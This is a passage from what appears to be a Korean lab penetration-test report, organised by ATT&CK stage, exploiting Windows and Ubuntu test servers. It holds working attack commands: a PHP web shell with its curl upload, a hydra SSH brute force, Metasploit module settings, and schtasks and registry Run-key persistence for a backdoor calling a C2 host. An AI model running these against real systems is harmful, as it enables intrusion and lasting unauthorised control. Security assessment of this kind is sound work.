*   **영향 분석:** SSH 접근 권한 획득은 공격자에게 안정적인 원격 제어 셸을 제공하여 내부망 침투의 교두보로 활용될 수 있다. 또한 탈취된 계정 정보는 다른 서비스에서도 재사용될 가능성이 높아 연쇄적인 침해 사고로 이어질 수 있다.

![wssh1](/assets/images/att-ck/3.1.2.1.ssh.png)
![wssh2](/assets/images/att-ck/3.1.2.2.ssh.png)

---

#### 3.1.3. IIS httpd 7.5(80): 서비스 거부(DoS) 공격 (MS15-034, T1499)
*   **시나리오 분석:** GVM 리포트에 따르면, IIS 7.5의 HTTP.sys 드라이버는 'Range' 헤더를 포함한 특수하게 조작된 HTTP 요청을 처리할 때 정수 오버플로우 취약점(MS15-034, CVE-2015-1635)이 발생한다. 이를 이용해 원격에서 커널 패닉을 유발하여 웹 서버를 다운시키고 시스템 전체를 마비시킬 수 있다.
*   **공격 검증:** Metasploit의 `auxiliary/dos/http/ms15_034_ulonglongadd` 모듈을 사용하여 공격한 결과, 대상 시스템에서 즉시 Blue Screen of Death (BSOD)가 발생하며 시스템이 다운되는 것을 확인했다.
*   **영향 분석:** 이 공격은 시스템 제어권을 획득하는 것은 아니지만, 서비스 가용성을 직접적으로 침해하여 비즈니스에 즉각적인 피해를 줄 수 있는 심각한 위협이며, 시스템 전체의 강제 재부팅을 유발한다.

![wiis1](/assets/images/att-ck/3.1.3.1.iis.png)
![wiis2](/assets/images/att-ck/3.1.3.2.iis.png)

---

#### 3.1.4. SMB(445): MS17-010 (EternalBlue) 공격 (CVE-2017-0144, T1190)
*   **시나리오 분석:** Nessus와 GVM 보고서에서 공통적으로 CVSS 10.0 만점으로 식별된 'MS17-010' 취약점은 Microsoft의 SMBv1 프로토콜 구현 결함을 이용해 인증 없이 원격으로 시스템 커널에 코드를 실행할 수 있게 한다.
*   **공격 검증:** Metasploit의 `exploit/windows/smb/ms17_010_eternalblue` 모듈을 사용하여 대상 서버를 공격한 결과, 예측대로 공격에 성공하여 `NT AUTHORITY\SYSTEM` 권한의 Meterpreter 세션을 즉시 획득하였다.
*   **영향 분석:** 이 단일 취약점 하나로 공격자는 시스템에 대한 완전한 제어권을 확보했다. WannaCry 랜섬웨어 사태의 핵심이었던 이 취약점의 존재는 정기적인 보안 패치 적용이 얼마나 중요한지를 명백히 보여준다.

![wsmb1](/assets/images/att-ck/3.1.4.1.smb.png)

---

#### 3.1.5. Java RMI(1617): 인증 우회 원격 코드 실행 (T1210)
*   **시나리오 분석:** GVM 리포트에서 발견된 바와 같이, Java RMI(Remote Method Invocation) 서비스의 JMX(Java Management Extensions) 인터페이스에 인증이 부적절하게 설정된 경우, 공격자는 인증 없이 원격으로 자바 코드를 실행할 수 있다. 공격자는 이 인터페이스를 통해 악성 MBean(Managed Bean)을 배포하여 임의의 명령을 실행할 수 있다.
*   **공격 검증:** Metasploit의 `exploit/multi/misc/java_jmx_server` 모듈을 사용하여 공격한 결과, 성공적으로 자바 페이로드를 실행하여 셸을 획득하였다.
*   **영향 분석:** 주로 내부 시스템 간의 통신에 사용되어 보안에 소홀하기 쉬운 RMI와 같은 서비스의 설정 미비는 공격자에게 예상치 못한 침투 경로를 제공할 수 있다. 개발 및 테스트 단계에서 편의를 위해 열어둔 설정이 운영 환경에 그대로 반영될 때 심각한 보안 사고로 이어진다.

![wjava1](/assets/images/att-ck/3.1.5.1.java.png)

---

#### 3.1.6. Oracle GlassFish 4.0(4848): 관리자 계정 탈취 및 악성 WAR 배포 (T1190, T1078, T1110)
*   **시나리오 분석:** GlassFish 서버 역시 Tomcat과 유사하게 `admin:admin`, `admin:password`, `admin:sploit` 등 추측하기 쉬운 기본 관리자 계정을 사용하는 경우가 많다. 이는 Nessus 리포트에서 발견된 Oracle GlassFish Server Path Traversal(CVE-2017-1000028) 등 다른 인증 관련 취약점과 결합될 시 심각한 위협이 된다. 이 시나리오에서는 Metasploit의 Brute-force 모듈로 관리자 계정을 탈취한 후, 관리자 페이지의 애플리케이션 배포 기능을 통해 `msfvenom`으로 사전에 제작된 악성 `shell.war` 파일을 업로드하여 시스템 셸을 획득한다.
*   **공격 검증:** Metasploit의 `auxiliary/scanner/http/glassfish_login` 모듈을 사용하여 `admin:sploit` 계정 탈취에 성공하였다. 이후 관리자 페이지(4848 포트)에 로그인하여 'Applications' 메뉴를 통해 `msfvenom`으로 생성한 `shell.war` 파일을 수동으로 배포하였고, 성공적으로 리버스 셸을 획득하였다.
*   **영향 분석:** 여러 다른 서비스에서 동일하거나 유사한 취약점이 반복적으로 발견된다는 것은 개발 및 운영 단계에서 표준화된 보안 설정(Hardening) 가이드라인이 부재함을 시사한다.

![wfish1](/assets/images/att-ck/3.1.6.1.fish.png)
![wfish2](/assets/images/att-ck/3.1.6.2.fish.png)
![wfish3](/assets/images/att-ck/3.1.6.3.fish.png)

---

#### 3.1.7. ManageEngine(8022): 인증 우회 원격 코드 실행 (CVE-2015-8249, T1190)
*   **시나리오 분석:** GVM 리포트에 따르면, ManageEngine Desktop Central 서비스의 `FileUploadServlet`에서 특정 파라미터(connectionId) 처리 과정에 존재하는 취약점(CVE-2015-8249)을 통해 인증을 우회하고 임의의 파일을 업로드하여 코드를 실행할 수 있다. 공격자는 이 취약점을 이용해 웹 셸을 서버에 업로드하고 실행시켜 제어권을 획득한다.
*   **공격 검증:** Metasploit의 `exploit/windows/http/manageengine_connectionid_write` 관련 모듈을 사용하여 공격한 결과, 취약점을 통해 악성 파일이 성공적으로 업로드 및 실행되어 `local service` 권한의 셸을 획득하는 데 성공했다.
*   **영향 분석:** 시스템 관리의 편의성을 위해 도입된 서드파티 소프트웨어는 강력한 권한을 가지는 경우가 많아, 패치 관리가 소홀할 경우 오히려 시스템 전체를 위협하는 심각한 구멍이 될 수 있다.

![wman1](/assets/images/att-ck/3.1.7.1.manage.png)

---

#### 3.1.8. Apache Tomcat(8282): 관리자 계정 탈취를 통한 RCE (T1078, T1110)
*   **시나리오 분석:** `hydra`와 `rockyou.txt`로 Tomcat 관리자 페이지에 대한 Brute-force 공격을 수행하여 관리자 계정을 탈취하고, 관리 페이지의 WAR 파일 배포 기능을 통해 악성 `shell.war` 파일을 업로드하여 셸을 확보하는 시나리오.
*   **공격 검증:** Brute-force 공격으로 계정 탈취 후, `exploit/multi/http/tomcat_mgr_upload` 모듈에 탈취한 자격증명을 입력하여 `shell.war`를 배포하고 Meterpreter 세션을 획득했다.
*   **영향 분석:** 취약한 기본 계정 설정은 공격자에게 시스템 제어권을 넘겨주는 가장 손쉽고 치명적인 위협 중 하나이며, 강력한 암호 정책의 부재를 단적으로 보여준다.

![wtom1](/assets/images/att-ck/3.1.8.1.tomcat.png)
![wtom2](/assets/images/att-ck/3.1.8.2.tomcat2.png)

---

#### 3.1.9. WebDAV(8585): 임의 파일 업로드를 통한 웹 셸 실행 (T1608.002)
*   **시나리오 분석:** Nmap 스캔 결과 8585 포트에서 실행 중인 서비스는 `Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)`로, WebDAV 기능이 활성화되어 있음을 확인했다. WebDAV(Web Distributed Authoring and Versioning)는 HTTP 프로토콜의 확장으로, 웹 서버의 파일을 원격으로 관리할 수 있게 해준다. 만약 특정 디렉터리에 인증이나 쓰기 권한 제어가 부적절하게 설정되어 있다면, 공격자는 임의의 파일을 서버에 업로드할 수 있다. 이 시나리오에서는 웹 브라우저를 통해 쓰기 권한이 열려있는 `uploads` 디렉터리를 식별하고, 커맨드라인 도구 `curl`을 사용하여 해당 디렉터리에 PHP 웹 셸을 업로드하여 원격 코드 실행(RCE)을 시도한다.
*   **공격 검증:**
    1.  웹 브라우저를 통해 `http://10.0.0.31:8585/`에 접속하여 서버를 탐색한 결과, 별도의 인증 없이 접근 가능하며 쓰기 권한이 열려있는 `uploads` 하위 디렉터리를 발견했다.
    2.  공격자 PC에서 `echo "<?php system(\$_GET['cmd']); ?>" > webshell.php` 명령어를 사용하여 원격 명령 실행이 가능한 간단한 PHP 웹 셸 파일을 생성했다.
    3.  `curl`의 `-T` 옵션을 사용하여 준비된 웹 셸 파일을 대상 서버의 `uploads` 디렉터리에 HTTP PUT 요청으로 업로드했다: `curl -T webshell.php http://10.0.0.31:8585/uploads/webshell.php`. 서버로부터 `201 Created` 응답을 받아 파일이 성공적으로 생성되었음을 확인했다.
    4.  업로드 성공 후, 웹 브라우저를 통해 `http://10.0.0.31:8585/uploads/webshell.php?cmd=whoami`와 같이 URL 파라미터로 명령어를 전달했다. 그 결과, 웹 페이지에 `nt authority\local service`이라는 결과가 출력되어, 시스템 최고 권한으로 원격 명령어가 실행됨을 확인했다.
*   **영향 분석:** 파일 업로드 기능에 대한 부적절한 접근 제어는 공격자에게 웹 셸을 통한 원격 코드 실행 경로를 직접적으로 제공하는 매우 심각한 설정 오류이다. 이를 통해 공격자는 안정적인 백도어를 확보하고, 추가적인 악성코드를 다운로드하거나, 내부망의 다른 시스템을 공격하기 위한 교두보로 이 서버를 활용할 수 있다.

![wweb1](/assets/images/att-ck/3.1.9.1.webdav.png)
![wweb2](/assets/images/att-ck/3.1.9.2.webdav.png)

---

#### 3.1.10. Elasticsearch 1.1.1(9200): 원격 코드 실행 (ESA-2015-06, T1190)
*   **시나리오 분석:** Nessus 리포트에서 CVSS 9.8점의 'Critical' 등급으로 발견된 Elasticsearch의 동적 스크립팅 기능 샌드박스 우회 취약점(ESA-2015-06, CVE-2015-1427)을 이용한다. Elasticsearch 1.3.2 이전 버전의 기본 스크립팅 엔진(Groovy)은 샌드박스가 존재하지만, 특정 방식으로 조작된 코드를 통해 이를 우회하고 Java 클래스를 직접 호출하여 임의의 코드를 실행할 수 있다. Nmap 스캔에서 식별된 1.1.1 버전은 이 취약점에 해당한다. 공격자는 Elasticsearch의 검색 API를 통해 이 취약점을 트리거하는 악의적인 스크립트를 포함한 JSON 쿼리를 전송하여 시스템 셸을 획득할 수 있다.
*   **공격 검증:**
    1.  Metasploit 프레임워크의 `exploit/multi/elasticsearch/script_mvel_rce` 모듈을 사용했다.
    2.  `set RHOSTS 10.0.0.31`, `set RPORT 9200`으로 공격 대상을 설정하고 `exploit` 명령을 실행했다.
    3.  해당 모듈은 취약점을 악용하는 JSON 쿼리를 Elasticsearch 서버로 전송했고, 성공적으로 페이로드를 실행시켜 공격자의 C2 서버로 연결되는 Meterpreter 세션을 획득하였다. `getuid` 명령어로 확인 결과, Elasticsearch 서비스를 실행하는 사용자 권한을 확보했다.
*   **영향 분석:** 데이터베이스 및 검색 엔진과 같은 백엔드 컴포넌트의 취약점은 매우 치명적이다. 외부로 직접 노출되지 않더라도 다른 서비스를 통해 연쇄적으로 악용될 수 있으며, 일단 악용되면 시스템에 대한 직접적인 제어권을 허용하는 경우가 많다. 공격자는 획득한 셸을 통해 저장된 모든 데이터에 접근하거나, 권한 상승 공격을 통해 시스템 전체를 장악하고 내부망으로 공격을 확장할 수 있다.

![wele1](/assets/images/att-ck/3.1.10.1.elesearch.png)

---

### 3.2. Ubuntu Server (10.0.0.42) 공격

Windows 서버와 마찬가지로, 정찰 단계에서 식별된 취약점을 기반으로 Ubuntu 서버에 대한 침투를 시도했다. Apache 웹 애플리케이션의 다양한 취약점부터, Samba, CUPS, MySQL, UnrealIRCd 등 여러 서비스에 걸쳐 존재하는 심각한 결함들을 포트 번호 오름차순으로 공략했다.

---

#### 3.2.1. FTP (21/tcp): 평문 로그인 스니핑을 통한 계정 탈취 (T1040)
*   **시나리오 분석:** GVM 리포트에서 우분투 서버의 FTP 서비스가 암호화되지 않은 평문(Cleartext) 로그인을 허용하는 'Medium' 등급의 취약점이 식별되었다. 이는 공격자가 중간에서 네트워크 트래픽을 가로채는 '스니핑(Sniffing)' 공격을 통해, FTP에 로그인하는 사용자의 아이디와 비밀번호를 그대로 훔쳐볼 수 있음을 의미한다. 공격자는 동일 네트워크 대역에 위치한 이점을 활용하여 `Wireshark`와 같은 패킷 분석 도구로 이 취약점을 공략한다.
*   **공격 검증:**
    1.  공격자 PC(Kali)에서 `Wireshark`를 실행하고, 대상 서버(10.0.0.42)와의 통신이 이루어지는 네트워크 인터페이스에서 패킷 캡처를 시작했다.
    2.  `ftp` 라는 디스플레이 필터를 적용하여 FTP 관련 트래픽만 모니터링했다.
    3.  다른 터미널 창에서 `ftp 10.0.0.42` 명령으로 대상 서버에 접속을 시도하고, 사용자 이름(`vagrant`)과 비밀번호(`vagrant`)를 입력했다.
    4.  로그인 시도와 동시에, Wireshark 캡처 화면에서 FTP 프로토콜 패킷들이 잡히는 것을 확인했다. 패킷 내용을 분석하자, `Request: USER vagrant` 와 `Request: PASS vagrant` 라는 명령어가 암호화되지 않은 평문 그대로 노출된 것을 명확하게 확인할 수 있었다.
*   **영향 분석:** 이 공격으로 탈취한 `vagrant:vagrant` 계정 정보는 매우 치명적인 결과를 초래한다. 만약 이 계정이 SSH 접속이나 `sudo` 권한 등 다른 중요한 서비스에서도 동일하게 사용된다면(Password Reuse), 공격자는 FTP 접근 권한을 넘어 시스템의 셸을 획득하거나 관리자 권한을 얻는 등 즉각적인 **권한 상승 및 횡적 이동**의 발판을 마련하게 된다. 이는 오래되고 안전하지 않은 프로토콜을 사용하는 것과 취약한 암호 정책이 결합되었을 때의 파괴력을 보여주는 전형적인 사례이다.

![uftp1](/assets/images/att-ck/3.2.1.1.ftp.png)

---

#### 3.2.2. SSH (22/tcp): Brute-Force를 통한 계정 탈취 (T1110.001)
*   **시나리오 분석:** Nessus 리포트에서 SSH 서비스에 대해 'SSH Weak MAC Algorithms Enabled', 'SSH Server CBC Mode Ciphers Enabled' 등 여러 보안 설정 미흡이 지적되었다. 이는 오래된 암호화 표준을 사용하고 있음을 의미하며, 전반적인 보안 인식이 낮아 관리자 계정의 비밀번호 또한 취약할 가능성이 높다고 추론할 수 있다. 이에 `rockyou.txt`라는 대규모 사전 파일을 사용하여 `vagrant`와 같은 일반적이거나 테스트용으로 생성되었을 법한 계정에 대한 무차별 대입 공격을 시도한다.
*   **공격 검증:**
    1.  `hydra -l vagrant -P /usr/share/wordlists/rockyou.txt 10.0.0.42 ssh -t 4` 명령어를 실행했다.
        *   `-l vagrant`: `vagrant`라는 특정 사용자 이름을 타겟으로 지정한다.
        *   `-P /usr/share/wordlists/rockyou.txt`: 패스워드 목록으로 `rockyou.txt` 파일을 사용한다.
        *   `-t 4`: 동시에 시도할 연결 수를 4개로 제한하여 서버의 SSH 데몬에 의해 차단될 가능성을 줄인다.
    2.  수 분 내에 Hydra는 `vagrant` 계정의 패스워드가 `vagrant`임을 찾아내는 데 성공했다.
    3.  `ssh vagrant@10.0.0.42` 명령과 탈취한 패스워드를 사용하여 시스템에 원격으로 접속하고, `whoami`, `ls -la` 등의 명령어를 통해 일반 사용자 권한의 셸을 완전히 확보했음을 확인했다.
*   **영향 분석:** SSH 접근 권한 획득은 공격자에게 안정적인 대화형 셸(Interactive Shell)을 제공한다. 이는 단순히 단일 명령을 실행하는 웹 셸과 달리, 시스템을 탐색하고, 스크립트를 실행하며, 파일을 업로드/다운로드하는 등 훨씬 더 복잡하고 정교한 후속 공격을 수행할 수 있는 완벽한 교두보가 된다. 특히 후술할 커널 익스플로잇을 통한 '권한 상승' 공격의 필수적인 발판이 되었다.

![ussh1](/assets/images/att-ck/3.2.2.1.ssh.png)
![ussh2](/assets/images/att-ck/3.2.2.2.ssh.png)

---

#### 3.2.3. HTTP (80/tcp): 다중 웹 애플리케이션 취약점 공격
*   **시나리오 분석:** Apache 웹 서버는 Drupal, phpMyAdmin, 그리고 커스텀 PHP 애플리케이션 등 여러 애플리케이션을 동시에 호스팅하고 있어 공격 표면이 매우 넓다. 정찰 결과, 특히 Drupal에서 두 가지 치명적인 원격 코드 실행(RCE) 취약점이 식별되었다.
    1.  **Drupal Coder Module RCE (T1190):** Nessus에서 'Critical'로 탐지된 이 취약점은 Drupal의 Coder 모듈에 존재하는 역직렬화(Deserialization) 취약점이다.
    2.  **Drupageddon RCE (T1190):** Nessus에서 'High'로 탐지된 Drupal 코어의 SQL Injection 취약점(CVE-2014-3704)을 이용한 원격 코드 실행 공격이다.
    이 두 가지 경로를 모두 공략하여 웹 서버 권한을 획득한다.
*   **공격 검증:**
    1.  **Coder Module RCE 공격:** Metasploit의 `exploit/unix/webapp/drupal_coder_exec` 모듈을 사용하여 Drupal의 역직렬화 취약점을 공격, `www-data` (웹 서버 데몬) 사용자 권한의 Meterpreter 세션을 획득했다.
    2.  **Drupageddon RCE 공격:** Metasploit의 `exploit/multi/http/drupal_drupageddon` 모듈을 사용하여 Drupageddon 취약점을 공격, 동일하게 `www-data` 권한의 셸을 추가로 획득하는 데 성공했다.
*   **영향 분석:** 단일 웹 서버 포트를 통해 두 가지 다른 경로의 원격 코드 실행(RCE) 공격이 모두 성공했다. 이는 웹 애플리케이션과 그 플러그인에 대한 패치 관리가 전혀 이루어지지 않고 있음을 증명한다. 공격자는 여러 공격 경로를 통해 시스템에 대한 지속적인 접근을 유지할 수 있으며, 획득한 `www-data` 셸은 내부 정보 수집 및 추가 공격의 교두보가 된다.

![uhttp1](/assets/images/att-ck/3.2.3.1.http.png)
![uhttp2](/assets/images/att-ck/3.2.3.2.http.png)

---

#### 3.2.4. Samba (445/tcp): "SambaCry" 원격 코드 실행 시도 및 실패 (CVE-2017-7494, T1190)

*   **시나리오 분석:** Nmap으로 확인된 `Samba 4.3.11-Ubuntu` 버전은 'SambaCry'로 알려진 심각한 원격 코드 실행 취약점(CVE-2017-7494)에 영향을 받을 가능성이 매우 높다. 이 취약점의 핵심은 공격자가 쓰기 가능한 공유 폴더에 악의적인 공유 라이브러리(`.so` 파일)를 업로드한 후, 서버가 이 라이브러리를 로드하고 실행하도록 강제할 수 있다는 점이다. Samba가 `root` 권한으로 실행되는 경우가 많기 때문에, 이 공격이 성공했다면 즉시 시스템 최고 권한 탈취로 이어질 수 있는 가장 치명적인 공격 경로 중 하나였다.
*   **공격 검증:**
    1.  `smbclient -L //10.0.0.42 -N` 명령을 실행하여 서버의 공유 목록을 확인했다. 그 결과, 별도의 인증 없이 누구나 접근 가능한 `public` 공유 폴더가 존재하는 심각한 설정 오류를 발견했다.
    2.  이 쓰기 가능한 공유 폴더를 이용하여 SambaCry 공격을 시도하기 위해 Metasploit의 `exploit/linux/samba/is_known_pipename` 모듈을 사용했다.
    3.  모듈 옵션에서 `set RHOSTS 10.0.0.42`, `set SMB_SHARE_NAME public`을 설정하고 공격을 실행했다.
    4.  **공격은 최종적으로 실패했다.** Metasploit 로그를 상세히 분석한 결과, 공격 과정은 두 단계로 나뉘었다.
        *   **1단계 (페이로드 업로드): 성공.** 모듈은 `public` 공유 폴더에 쓰기 권한이 있음을 확인하고, 악성 페이로드가 담긴 `.so` 파일을 성공적으로 업로드했다 (`Uploaded payload to \\10.0.0.42\public\...`). 이는 익명 사용자가 서버에 임의의 파일을 쓸 수 있다는 것 자체만으로도 심각한 보안 문제임을 증명한다.
        *   **2단계 (페이로드 로딩): 실패.** 페이로드를 업로드한 후, 모듈은 취약점을 트리거하여 Samba 서비스가 해당 `.so` 파일을 로드하도록 강제하려 시도했다. 하지만 이 단계에서 서버는 `STATUS_OBJECT_NAME_NOT_FOUND` 오류를 반환하며 페이로드를 로드하는 데 실패했다.
    5.  결과적으로, 악성 파일은 서버에 업로드되었지만 실행되지 않았으므로 셸을 획득하지는 못했다.
*   **영향 분석:** 비록 원격 코드 실행이라는 최종 목표는 달성하지 못했지만, 이 공격 시도는 두 가지의 중대한 보안 문제를 명확히 드러냈다.
    1.  **패치되지 않은 서비스 운영:** 잠재적으로 치명적인 'SambaCry' 취약점이 존재하는 구버전의 Samba 서비스를 그대로 운영하고 있었다.
    2.  **안일한 공유 폴더 설정:** 인증 없이 누구나 파일을 쓰고 읽을 수 있는 'public' 공유 폴더의 존재는 랜섬웨어 배포, 악성코드 유포, 정보 유출의 직접적인 통로가 될 수 있다.
    이번 공격이 실패한 것은 Samba 설정 파일(`smb.conf`)의 특정 옵션이나 Ubuntu 배포판에서 적용한 미세한 패치 차이로 인해 해당 Metasploit 모듈이 예상대로 동작하지 않았기 때문일 가능성이 높다. 하지만 이는 운이 좋았을 뿐이며, 다른 공격 기법이나 약간의 환경 변화만 있었다면 이 취약점은 즉시 시스템 전체를 장악하는 `root` 권한 탈취로 이어졌을 것이다. 따라서 이 결과는 성공한 공격 못지않게 심각한 위험 경고로 받아들여야 한다.

![usmb1](/assets/images/att-ck/3.2.4.1.smb.png)
![usmb2](/assets/images/att-ck/3.2.4.2.smb.png)

---

#### 3.2.5. CUPS (631/tcp): Shellshock RCE 시도 실패 및 취약한 암호화 확인
*   **시나리오 분석:** 631번 포트에서 실행 중인 CUPS(Common Unix Printing System) 서비스는 두 가지의 잠재적인 공격 벡터에 동시에 노출되어 있었다. 이는 서비스 자체의 취약점과 통신 암호화의 취약점이 결합된 최악의 시나리오로, 두 경로 모두에 대한 공격을 시도했다.
    *   **공격 벡터 1: Shellshock 원격 코드 실행 (CVE-2014-6271, T1190):** 2014년에 발견된 'Shellshock'는 Bash 셸 자체의 결함을 이용한다. CUPS 서비스는 내부적으로 CGI 스크립트를 통해 Bash 셸을 사용하므로, 공격자는 HTTP 요청 헤더에 악성 코드를 삽입하여 전송하는 것만으로 서버에서 임의의 명령을 실행할 수 있을 것으로 예상되었다.
    *   **공격 벡터 2: 취약한 SSL/TLS 암호화 (CVE-2016-2183, SWEET32):** GVM 및 Nessus 스캔 결과, CUPS의 웹 관리 인터페이스(HTTPS) 통신에서 **SWEET32** 공격에 취약한 구형 **3DES 암호화**가 사용되고 있음이 확인되었다. 이는 네트워크 트래픽 도청을 통해 민감 정보를 탈취할 수 있는 경로를 제공한다.
*   **공격 검증:**
    1.  **(Shellshock RCE 시도 및 실패):** Metasploit의 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 모듈을 사용했다. `set RHOSTS 10.0.0.42`, `set RPORT 631`, `set TARGETURI /cgi-bin/admin/admin.cgi`로 옵션을 설정하고 공격을 실행했다. **그러나 공격은 실패했다.** Metasploit 로그에서 확인된 바와 같이, 페이로드 전송 후 생성된 Meterpreter 세션들이 "not valid and will be closed" 메시지와 함께 즉시 종료되었다. 최종적으로 어떠한 셸도 획득하지 못했다.
    2.  **(취약한 암호화 검증):** Shellshock 공격은 실패했지만, 암호화 관련 취약점은 명확히 존재했다. `nmap --script ssl-enum-ciphers -p 631 10.0.0.42` 명령을 직접 실행한 결과, 스캐너의 보고와 일치하게 해당 포트가 보안에 취약한 **TLSv1.0** 및 **TLSv1.1** 프로토콜을 지원하며, **SWEET32 공격에 취약한 `TLS_RSA_WITH_3DES_EDE_CBC_SHA` 암호화 스위트**를 사용하고 있음을 재차 확인했다.
*   **영향 분석:** 이번 공격 시도를 통해 두 가지 중요한 사실을 알 수 있다.
    *   **Shellshock 공격 실패 분석:** 초기 접근을 위한 가장 직접적인 RCE 공격은 실패했다. 이는 대상 CGI 스크립트(`/cgi-bin/admin/admin.cgi`)가 존재하지 않거나, 해당 Ubuntu 배포판의 Bash 버전에 이 특정 Metasploit 모듈을 우회하는 일부 완화 조치가 적용되었을 가능성을 시사한다. 이는 자동화된 스캐너의 보고가 항상 100% 성공적인 익스플로잇으로 이어지지는 않음을 보여주는 중요한 사례이다.
    *   **여전히 유효한 암호화 취약점:** 비록 RCE는 실패했지만, CUPS 서비스가 구식이고 취약한 암호화 프로토콜 및 암호화 스위트를 사용하고 있다는 사실은 변하지 않는다. 이는 당장 시스템 제어권을 주지는 않지만, 네트워크 경계가 이미 뚫린 내부망 환경에서 관리자의 통신 내용을 도청(Eavesdropping)하여 추가적인 자격 증명을 탈취하거나 세션을 하이재킹하는 **심각한 2차 공격의 발판**이 될 수 있다. 이 두 가지 문제점의 공존은 해당 서비스가 패치 및 보안 설정 관리 양쪽 측면에서 모두 방치되어 있음을 명백히 증명한다.

![ucups1](/assets/images/att-ck/3.2.5.1.cups.png)
![ucups2](/assets/images/att-ck/3.2.5.2.cups.png)

---

#### 3.2.6. IRC (6697/tcp): UnrealIRCd 백도어 원격 코드 실행 (CVE--2010-2075, T1190)
*   **시나리오 분석:** 대상 서버에 설치된 `UnrealIRCd 3.2.8.1` 버전에는 공식 소스 코드에 의도적으로 심어진 악의적인 백도어(CVE-2010-2075)가 존재한다. 이는 2009년 11월부터 2010년 6월까지 배포된 공식 소스 코드 아카이브가 공격자에 의해 트로이목마화되어 유포된 실제 공급망 공격(Supply Chain Attack) 사례이다. 이 백도어는 디버깅 코드처럼 위장되어 있으며, IRC 서버에 접속한 공격자가 시스템 명령어 `AB;[command]`를 서버로 전송하면, 서버가 `[command]` 부분을 추출하여 `system()` 함수로 실행시킨다. 이는 인증이나 복잡한 익스플로잇 과정 없이, 단순히 특정 문자열을 보내는 것만으로 원격 코드 실행이 가능한 매우 직접적이고 치명적인 백도어이다.
*   **공격 검증:**
    1.  Metasploit의 `exploit/unix/irc/unreal_ircd_3281_backdoor` 모듈을 사용했다. 이 모듈은 이 백도어를 트리거하는 로직을 그대로 구현하고 있다.
    2.  `set RHOSTS 10.0.0.42`로 대상을 설정하고 `exploit` 명령을 실행했다.
    3.  모듈은 대상 서버의 6697 포트로 접속하여 백도어 트리거 문자열(`AB;`)과 리버스 셸을 실행하는 페이로드를 전송했다.
    4.  서버의 백도어 코드가 페이로드를 실행했고, 그 결과 공격자의 C2 서버로 즉시 셸이 연결되었다. 셸에서 `id` 명령어를 실행하여 IRC 데몬을 실행하는 사용자 권한을 획득했음을 확인했다.
*   **영향 분석:** 이는 오픈소스 소프트웨어의 신뢰성을 근본적으로 위협하는 공급망 공격의 대표적인 사례이다. 사용자가 공식 배포처에서 다운로드한 파일조차 신뢰할 수 없을 때 발생하는 최악의 시나리오를 보여준다. 알려진 백도어가 포함된 버전을 사용하는 것은 시스템의 모든 보안 설정을 무력화하고 공격자에게 즉각적인 제어권을 넘겨주는 행위와 같다. 다운로드한 소프트웨어의 해시 값을 확인하고, 버전 관리를 통해 알려진 백도어 이슈가 없는지 확인하는 것이 얼마나 중요한지를 명확히 보여준다.

![uirc](/assets/images/att-ck/3.2.6.1.irc.png)

* * *
{:.short-rule}

## 4. 실행 Execution

초기 접근을 통해 시스템의 발판(Foothold)을 마련한 후, 공격자는 목표 달성을 위해 시스템에서 악성 코드나 명령어를 실행해야 한다. 이 단계는 공격자가 확보한 제한적인 접근 권한을 실질적인 시스템 제어권으로 전환하는 과정이다.

*   **기술 분석 (T1059: Command and Scripting Interpreter):** 공격자는 대상 시스템에 내장된 커맨드 셸(Windows의 `cmd.exe`, `PowerShell.exe` / Linux의 `/bin/sh`, `/bin/bash`)을 사용하여 명령어를 실행한다. 이는 별도의 악성 파일을 설치하지 않고도 시스템의 기본 기능을 악용하여 공격을 수행하는 'Living off the Land' 기법의 일환이다.
*   **공격 검증 (T1059.003: Windows Command Shell):**
    1.  '초기 접근' 단계에서 Apache Tomcat 취약점 공격으로 획득한 Meterpreter 세션을 활용했다.
    2.  Meterpreter 프롬프트에서 `shell` 명령어를 입력하여 대상 시스템의 대화형 커맨드 셸(`cmd.exe`)로 전환했다.
    3.  `whoami`, `ipconfig`, `systeminfo`와 같은 기본 명령어들을 실행하여, 공격자가 웹 서버 프로세스의 권한(`nt authority\system`)으로 대상 시스템을 직접 제어할 수 있음을 확인했다.
*   **영향 분석:** 이 단계의 성공은 공격자가 더 이상 웹 취약점과 같은 간접적인 경로에 의존하지 않고, 운영체제 수준에서 직접적인 제어를 시작했음을 의미한다. 이를 통해 공격자는 시스템 정보를 수집하고, 보안 설정을 변경하며, 추가적인 악성코드를 다운로드하여 실행하는 등 후속 공격을 위한 모든 기반을 마련할 수 있다.

![wex1](/assets/images/att-ck/4.1.ex.png)
![wex2](/assets/images/att-ck/4.2.ex.png)

## 5. 지속성 확보 Persistence

공격자는 시스템이 재부팅되거나, 현재 사용 중인 익스플로잇 세션이 끊어지더라도 대상 시스템에 대한 접근 권한을 잃지 않기 위해 지속성 메커니즘을 구축한다. 이는 공격자가 원할 때 언제든지 다시 시스템에 접근할 수 있도록 '백도어'를 설치하는 과정이다.

#### 5.1. Windows Server (10.0.0.31): 예약 작업 및 레지스트리 Run 키 활용
*   **기술 분석:** Windows 운영체제는 시스템 시작 시 또는 특정 이벤트 발생 시 자동으로 프로그램을 실행하는 다양한 메커니즘을 제공한다. 공격자는 주로 **예약 작업(Scheduled Task)**과 **레지스트리 Run 키(Registry Run Keys)**를 악용하여 자신의 악성 코드가 자동으로 실행되도록 설정한다.
*   **공격 검증:**
    1.  `msfvenom`으로 C2 서버(10.0.0.32)로 연결을 시도하는 `backdoor.exe` 페이로드를 생성했다.
    2.  확보한 Meterpreter 세션의 `upload` 명령어를 사용하여 `backdoor.exe`를 대상 시스템의 `C:\Users\vagrant\` 디렉터리에 업로드했다.
    3.  두 가지 지속성 기법을 적용했다.
        *   **예약 작업 등록 (T1053.005):** `schtasks /create /tn "SecurityUpdate" /tr "C:\Users\vagrant\backdoor.exe" /sc onlogon /ru "SYSTEM"` 명령어를 실행했다. 이 명령은 'SecurityUpdate'라는 이름으로, 모든 사용자가 로그온할 때마다 `backdoor.exe`를 `SYSTEM` 최고 권한으로 실행하는 작업을 등록한다.
        *   **레지스트리 Run 키 등록 (T1547.001):** `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "WinUpdate" /t REG_SZ /d "C:\Users\vagrant\backdoor.exe"` 명령어를 실행했다. 이 명령은 `HKEY_LOCAL_MACHINE`의 Run 키에 `backdoor.exe`를 등록하여, 어떤 사용자가 로그인하더라도 백도어가 자동으로 실행되도록 설정한다.
